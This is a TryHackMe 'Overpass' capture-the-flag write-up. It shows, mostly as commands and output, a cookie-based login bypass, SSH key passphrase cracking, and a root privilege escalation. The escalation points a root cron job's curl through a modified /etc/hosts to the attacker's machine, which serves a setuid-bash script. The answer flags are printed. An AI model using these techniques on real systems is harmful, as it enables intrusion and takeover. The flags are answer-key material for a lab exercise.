Swatish Attaluri
Date: 31-05-2021
## Overpass - Tryhackme
### Machine IP: 10.10.57.133
#### Nmap scan
without -Pn: the states are filtered
```bash

$ nmap -sV -sC -oN ports 10.10.57.133 -Pn                                                            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 20:19 IST
Nmap scan report for 10.10.57.133
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.49 seconds

```
#### Checking the website
There is a login page on /admin
View source and check for js files. 
Vulnerable code in login.js
```javascript
if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```
The above code checks if statusOrCookie is "Incorrect credentials", if it is then, login fails.
But if a cookie named SessionToken is set which means it can have anything as a value, then we will be logged in.
Open browser console and type the following code:
#### Setting cookie on console
```console
Cookies.set("SessionToken", "123");
```
#### Login using SSH
We get a ssh key copy it to a file.
```bash
$ ssh -i id_rsa james@10.10.57.133   
The authenticity of host '10.10.57.133 (10.10.57.133)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.57.133' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
```
It asks for a passphrase. Lets use ssh2john to convert it to a hash and then use john.
```bash 
$ /usr/share/john/ssh2john.py id_rsa > hashforjohn
$ john hashforjohn.txt -w=/usr/share/wordlists/rockyou.txt | tee johnbruteforcehash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:01 15.81% (ETA: 08:27:27) 0.5076g/s 1261Kp/s 1261Kc/s 1261KC/s zone11champions
Session aborted
```
The passphrase is james13
```bash
$ ssh -i id_rsa james@10.10.57.133                                                                  
Enter passphrase for key 'id_rsa': james13
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun  1 02:57:59 UTC 2021

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.57.133
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1

james@overpass-prod:~$ ls 
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}

james@overpass-prod:~$ ls -la
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
james@overpass-prod:~$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```
The above string is rot47 encoded. Use https://www.dcode.fr/cipher-identifier to find out encryption.
Lets decode it
Rot47 uses a larger character set than rot13 such as adding symbols.
{"name":"System","pass":"saydrawnlyingpicture"}
password for james: saydrawnlyingpicture
#### Privilege Escalation
```bash
james@overpass-prod:~$ sudo -l
[sudo] password for james: saydrawnlyingpicture
Sorry, user james may not run sudo on overpass-prod.
```
Nothing to run on sudo. Lets use linpeas.
First send linpeas from local machine
Receiver end:
```bash
$ nc -lvnp 1234 > linpeas.sh
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.17.6.214 46742 received!

```
Sender end:
``` bash
nc -w 3 10.10.57.133 1234 < linpeas.sh   
```
10.10.57.133 is the machine IP
```bash
james@overpass-prod:~$ chmod +x linpeas.ch
james@overpass-prod:~$ ./linpeas.sh
```
There is a cron job running curl overpass.thm/downloads/src/buildscript.sh
Linpeas also shows a vuln in /etc/hosts
Lets change ip in overpass.thm in /etc/hosts to our local machine ip.{NOT VPN}
as there is a script in /downloads/src
Lets create those directories in our own machine.
```bash

$ mkdir -p www/downloads/src
$ cd www/downloads/src;nano buildscript.sh
```
There is a buildscript.sh file running every minute, hour.
Lets create that file.
```bash

#! /bin/bash
chmod +s /bin/bash

```
/bin/bash is owned by root. Lets set a setuid bit for /bin/bash so that james can use bash as root.
As the file should be retrieved by the attackbox from our local machine, we need to set up a server on port 80 in directory "www"
```bash
$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.57.133 - - [01/Jun/2021 09:19:00] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```
After a minute the file gets executed in out attackbox.
```bash
james@overpass-prod:~$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
buildStatus  builds  go  root.txt  src
bash-4.4# cat root.txt 
thm{7f336f8c359dbac18d54fdd64ea753bb}
bash-4.4# 
```
bash -p to turn on privileged mode.
#### Answers
```body

1. Hack the machine and get the flag in user.txt
thm{65c1aaf000506e56996822c6281e6bf7}

2.Escalate your privileges and get the flag in root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}

```
#js
#cron
#bash